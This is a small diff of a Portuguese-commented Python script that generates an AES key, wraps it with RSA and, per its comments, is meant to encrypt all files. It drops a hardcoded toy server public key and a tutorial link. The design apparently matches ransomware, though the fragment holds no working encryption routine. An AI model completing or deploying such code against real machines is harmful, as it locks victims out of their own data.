@@ -112,17 +112,11 @@ def gera_chave_AES():
 # MAIN
 AES_key=gera_chave_AES()
 print('[*] chave AES gerada')
-# chave publica servidor
-serv_RSA=[1121,655]
-# gera_chaves_RSA.py
 #menu() # -> criptografa tudo
 RSA_to_AES()
 #AES_to_RSA()
-print('[*] chave AES criptografado com RSA')
+print('[*] chave AES criptografado com RSA keys')
 
-'''
-     USAR O RSA DA LIB CRYPTO -> https://www.youtube.com/watch?v=tXSb7O6fao8
-'''
 
     # criptografa todos os arquivos com AES
 
